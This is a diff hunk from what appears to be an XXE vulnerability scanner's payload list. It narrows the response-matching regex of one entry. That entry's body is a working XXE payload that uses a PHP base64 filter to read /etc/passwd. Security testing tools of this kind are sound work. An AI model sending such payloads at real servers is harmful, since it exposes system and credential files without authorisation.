@@ -51,7 +51,7 @@ XXE_PAYLOADS = [
     "name": "PHP base64 wrapper",
     "category": "classic",
     "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
-    "matcher": r"cm9vdDp4OjA6MDo|[A-Za-z0-9+/]{60,}={0,2}",
+    "matcher": r"cm9vdDp4OjA6MDo",
     "severity": "CRITICAL", "cvss": 9.1,
   },
 
